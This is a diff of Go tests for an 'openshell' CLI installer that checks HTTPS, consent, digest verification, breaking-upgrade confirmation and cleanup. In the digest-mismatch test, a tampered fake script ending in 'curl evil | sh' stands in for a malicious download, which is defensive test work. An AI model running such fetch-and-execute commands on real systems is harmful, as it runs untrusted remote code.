@@ -74,8 +74,7 @@ func newInstallFixture(t *testing.T, body, existing, after string) *installFixtu
 		_, _ = w.Write([]byte(body))
 	}))
 	t.Cleanup(f.srv.Close)
-	bin := t.TempDir()
-	f.cliPath = filepath.Join(bin, "openshell")
+	f.cliPath = filepath.Join(t.TempDir(), "openshell")
 	f.tempDir = t.TempDir()
 	version := existing
 	if existing != "" {
@@ -129,14 +128,21 @@ func writeExecutable(t *testing.T, path string) {
 
 func (f *installFixture) ran() bool { return f.runner.Called("/bin/sh") }
 
+// scriptRun returns the installer command, run through /bin/sh.
+func (f *installFixture) scriptRun() openshell.Command {
+	for _, c := range f.runner.Calls() {
+		if c.Name == "/bin/sh" {
+			return c
+		}
+	}
+	f.t.Fatal("the installer did not run")
+	return openshell.Command{}
+}
+
 func (f *installFixture) assertNoLeftovers() {
 	f.t.Helper()
-	entries, err := os.ReadDir(f.tempDir)
-	if err != nil {
-		f.t.Fatal(err)
-	}
-	if len(entries) != 0 {
-		f.t.Fatalf("installer left files behind in %s: %v", f.tempDir, entries)
+	if entries, err := os.ReadDir(f.tempDir); err != nil || len(entries) != 0 {
+		f.t.Fatalf("installer left files behind in %s: %v, %v", f.tempDir, entries, err)
 	}
 }
 
@@ -151,24 +157,13 @@ func TestInstallFresh(t *testing.T) {
 	}
 	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
 	res, err := f.inst.Install(context.Background())
-	if err != nil {
-		t.Fatalf("Install: %v", err)
-	}
-	if !res.Installed || res.CLIVersion.String() != "0.1.1" {
-		t.Fatalf("result = %+v", res)
+	if err != nil || !res.Installed || res.CLIVersion.String() != "0.1.1" || f.verified != 1 {
+		t.Fatalf("Install = %+v, %v (gateway verified %d times)", res, err, f.verified)
 	}
 	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
 		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
 	}
-	if f.verified != 1 {
-		t.Fatalf("gateway verified %d times", f.verified)
-	}
-	var run openshell.Command
-	for _, c := range f.runner.Calls() {
-		if c.Name == "/bin/sh" {
-			run = c
-		}
-	}
+	run := f.scriptRun()
 	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=v0.1.1", "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
 		t.Fatalf("installer env = %v", run.Env)
 	}
@@ -195,12 +190,9 @@ func TestInstallRefusesDigestMismatch(t *testing.T) {
 	consented := false
 	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
 	_, err := f.inst.Install(context.Background())
-	if !errors.Is(err, openshell.ErrDigestMismatch) {
-		t.Fatalf("err = %v, want ErrDigestMismatch", err)
-	}
 	var mismatch *openshell.DigestMismatchError
-	if !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
-		t.Fatalf("mismatch detail = %+v", mismatch)
+	if !errors.Is(err, openshell.ErrDigestMismatch) || !errors.As(err, &mismatch) || mismatch.Got != sha(fakeScript+"curl evil | sh\n") {
+		t.Fatalf("Install = %v (%+v), want ErrDigestMismatch", err, mismatch)
 	}
 	if consented || f.ran() || f.out.Len() != 0 {
 		t.Fatalf("a mismatched script reached consent=%v run=%v plan=%q", consented, f.ran(), f.out.String())
@@ -208,81 +200,57 @@ func TestInstallRefusesDigestMismatch(t *testing.T) {
 	f.assertNoLeftovers()
 }
 
-func TestInstallDownloadFailures(t *testing.T) {
-	cases := []struct {
+// TestInstallRefusals covers installs that stop before the script runs.
+func TestInstallRefusals(t *testing.T) {
+	for _, tc := range []struct {
 		name    string
 		mutate  func(f *installFixture)
+		wantIs  error
 		wantErr string
 	}{
-		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, "must be https"},
-		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, "HTTP 404"},
-		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, "exceeds 8 bytes"},
-	}
-	for _, tc := range cases {
+		{"http url", func(f *installFixture) { f.inst.URL = strings.Replace(f.inst.URL, "https://", "http://", 1) }, nil, "must be https"},
+		{"not found", func(f *installFixture) { f.inst.URL = f.srv.URL + "/missing.sh" }, nil, "HTTP 404"},
+		{"too large", func(f *installFixture) { f.inst.MaxScriptBytes = 8 }, nil, "exceeds 8 bytes"},
+		{"declined", func(f *installFixture) {
+			f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
+		}, openshell.ErrInstallDeclined, ""},
+		// Without a consent callback nothing is even downloaded.
+		{"no consent callback", func(f *installFixture) { f.inst.Consent = nil }, nil, ""},
+	} {
 		t.Run(tc.name, func(t *testing.T) {
 			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
 			tc.mutate(f)
 			_, err := f.inst.Install(context.Background())
-			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
-				t.Fatalf("err = %v, want %q", err, tc.wantErr)
+			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || (tc.wantIs != nil && !errors.Is(err, tc.wantIs)) {
+				t.Fatalf("Install = %v, want %q (%v)", err, tc.wantErr, tc.wantIs)
 			}
-			if f.ran() {
-				t.Fatal("installer ran")
+			if f.ran() || (f.inst.Consent == nil && f.hits.Load() != 0) {
+				t.Fatalf("installer ran %v after %d downloads", f.ran(), f.hits.Load())
 			}
 			f.assertNoLeftovers()
 		})
 	}
 }
 
-func TestInstallDeclined(t *testing.T) {
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
-	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { return false, nil }
-	if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrInstallDeclined) {
-		t.Fatalf("err = %v, want ErrInstallDeclined", err)
-	}
-	if f.ran() {
-		t.Fatal("installer ran without consent")
-	}
-	f.assertNoLeftovers()
-}
-
-func TestInstallNeedsConsentCallback(t *testing.T) {
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
-	f.inst.Consent = nil
-	if _, err := f.inst.Install(context.Background()); err == nil || f.hits.Load() != 0 {
-		t.Fatalf("err = %v, downloads = %d", err, f.hits.Load())
-	}
-}
-
 func TestInstallExistingReleases(t *testing.T) {
-	cases := []struct {
-		name      string
-		existing  string
-		installed bool
-		wantErr   func(error) bool
-		downloads int32
+	for _, tc := range []struct {
+		name, existing string
+		installed      bool
+		unsupported    bool
+		downloads      int32
 	}{
-		{name: "supported is kept", existing: "openshell 0.1.3", downloads: 0},
-		{name: "newer minor refused", existing: "openshell 0.2.0", downloads: 0, wantErr: func(err error) bool {
-			var u *openshell.ErrUnsupportedVersion
-			return errors.As(err, &u)
-		}},
+		{name: "supported is kept", existing: "openshell 0.1.3"},
+		{name: "newer minor refused", existing: "openshell 0.2.0", unsupported: true},
 		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
 		// As doctor advises: 0.0.37 and later need no cleanup.
 		{name: "0.0.40 upgraded in place", existing: "openshell 0.0.40", installed: true, downloads: 1},
-	}
-	for _, tc := range cases {
+	} {
 		t.Run(tc.name, func(t *testing.T) {
 			f := newInstallFixture(t, fakeScript, tc.existing, "openshell 0.1.1")
 			res, err := f.inst.Install(context.Background())
-			if tc.wantErr != nil {
-				if !tc.wantErr(err) {
-					t.Fatalf("err = %v", err)
-				}
-			} else if err != nil {
-				t.Fatalf("Install: %v", err)
-			} else if res.Installed != tc.installed {
-				t.Fatalf("installed = %v, want %v", res.Installed, tc.installed)
+			var u *openshell.ErrUnsupportedVersion
+			if tc.unsupported != errors.As(err, &u) || (!tc.unsupported && (err != nil || res.Installed != tc.installed)) {
+				t.Fatalf("Install = %+v, %v", res, err)
 			}
 			if got := f.hits.Load(); got != tc.downloads {
 				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
@@ -300,41 +268,29 @@ func TestInstallExistingReleases(t *testing.T) {
 func TestInstallBreakingUpgrade(t *testing.T) {
 	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
 		t.Run(existing, func(t *testing.T) {
-			t.Run("no confirmation callback", func(t *testing.T) {
-				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
-				_, err := f.inst.Install(context.Background())
-				if !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
-					t.Fatalf("err = %v ran = %v", err, f.ran())
-				}
-				if !strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
-					t.Fatalf("plan does not explain the cleanup:\n%s", f.out.String())
-				}
-				f.assertNoLeftovers()
-			})
-			t.Run("declined", func(t *testing.T) {
-				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
-				f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
-				if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
-					t.Fatalf("err = %v ran = %v", err, f.ran())
-				}
-			})
-			t.Run("confirmed", func(t *testing.T) {
-				f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
-				var confirmed *openshell.InstallPlan
-				f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
-				res, err := f.inst.Install(context.Background())
-				if err != nil || !res.Installed {
-					t.Fatalf("Install: %v %+v", err, res)
-				}
-				if confirmed == nil || !confirmed.BreakingUpgrade {
-					t.Fatalf("confirmation plan = %+v", confirmed)
-				}
-				for _, c := range f.runner.Calls() {
-					if c.Name == "/bin/sh" && !slices.Contains(c.Env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
-						t.Fatalf("installer env = %v", c.Env)
-					}
-				}
-			})
+			// No confirmation callback: refused, with the cleanup explained.
+			f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() ||
+				!strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
+				t.Fatalf("Install = %v (ran %v), plan:\n%s", err, f.ran(), f.out.String())
+			}
+			f.assertNoLeftovers()
+
+			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
+			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
+				t.Fatalf("declined: Install = %v (ran %v)", err, f.ran())
+			}
+
+			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			var confirmed *openshell.InstallPlan
+			f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
+			if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || confirmed == nil || !confirmed.BreakingUpgrade {
+				t.Fatalf("confirmed: Install = %+v, %v (plan %+v)", res, err, confirmed)
+			}
+			if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_ACK_BREAKING_UPGRADE=1") {
+				t.Fatalf("installer env = %v", env)
+			}
 		})
 	}
 }
@@ -369,17 +325,14 @@ func TestInstallReplacesLegacyCLI(t *testing.T) {
 		if !strings.Contains(f.out.String(), "then remove the old CLI") || !strings.Contains(f.out.String(), "    rm "+legacy) {
 			t.Fatalf("plan does not say to remove the old CLI:\n%s", f.out.String())
 		}
-		for _, c := range f.runner.Calls() {
-			if c.Name == "/bin/sh" && !slices.Contains(c.Env, "OPENSHELL_REGISTER_BIN="+f.cliPath) {
-				t.Fatalf("installer registers the gateway with PATH's CLI: env %v", c.Env)
-			}
+		if env := f.scriptRun().Env; !slices.Contains(env, "OPENSHELL_REGISTER_BIN="+f.cliPath) {
+			t.Fatalf("installer registers the gateway with PATH's CLI: env %v", env)
 		}
 	})
 	t.Run("removed as the plan says", func(t *testing.T) {
 		f, legacy := setup(t)
 		f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return true, os.Remove(legacy) }
-		res, err := f.inst.Install(context.Background())
-		if err != nil || res.CLIVersion.String() != "0.1.1" {
+		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != "0.1.1" {
 			t.Fatalf("Install = %+v, %v", res, err)
 		}
 	})
@@ -430,56 +383,34 @@ func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
 		f.runner.On(cli+" --version", "openshell 0.1.1\n", nil)
 		t.Setenv("HOME", home)
 		f.inst.Candidates = nil
-		res, err := f.inst.Install(context.Background())
-		if err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
+		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
 			t.Fatalf("Install = %+v, %v; want the CLI in the home directory found", res, err)
 		}
 	})
 }
 
 func TestInstallVerifiesOutcome(t *testing.T) {
-	t.Run("cli still old", func(t *testing.T) {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.0.40")
-		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "0.0.40") {
-			t.Fatalf("err = %v", err)
-		}
-	})
-	t.Run("no cli after install", func(t *testing.T) {
-		f := newInstallFixture(t, fakeScript, "", "")
-		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "no openshell CLI") {
-			t.Fatalf("err = %v", err)
-		}
-	})
-	t.Run("gateway unhealthy", func(t *testing.T) {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
-		f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
-		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "gateway is not healthy") {
-			t.Fatalf("err = %v", err)
-		}
-	})
-	t.Run("installer fails", func(t *testing.T) {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
-		f.runner.On("/bin/sh", "", errors.New("exit status 1"))
-		if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), "installer failed") {
-			t.Fatalf("err = %v", err)
-		}
-		f.assertNoLeftovers()
-	})
-}
-
-func TestVersionFromOutput(t *testing.T) {
-	for in, want := range map[string]string{
-		"openshell 0.1.1":            "0.1.1",
-		"openshell 0.1.2 (4ce767fc)": "0.1.2",
-		"openshell v0.0.16":          "0.0.16",
-		"0.1.1-1":                    "0.1.1",
+	for _, tc := range []struct {
+		name, after string
+		mutate      func(f *installFixture)
+		wantErr     string
+	}{
+		{"cli still old", "openshell 0.0.40", nil, "0.0.40"},
+		{"no cli after install", "", nil, "no openshell CLI"},
+		{"gateway unhealthy", "openshell 0.1.1", func(f *installFixture) {
+			f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
+		}, "gateway is not healthy"},
+		{"installer fails", "openshell 0.1.1", func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
 	} {
-		v, err := openshell.VersionFromOutput(in)
-		if err != nil || v.String() != want {
-			t.Errorf("VersionFromOutput(%q) = %v, %v; want %s", in, v, err, want)
-		}
-	}
-	if _, err := openshell.VersionFromOutput("openshell dev"); err == nil {
-		t.Error("a version-less line parsed")
+		t.Run(tc.name, func(t *testing.T) {
+			f := newInstallFixture(t, fakeScript, "", tc.after)
+			if tc.mutate != nil {
+				tc.mutate(f)
+			}
+			if _, err := f.inst.Install(context.Background()); err == nil || !strings.Contains(err.Error(), tc.wantErr) {
+				t.Fatalf("Install = %v, want %q", err, tc.wantErr)
+			}
+			f.assertNoLeftovers()
+		})
 	}
 }
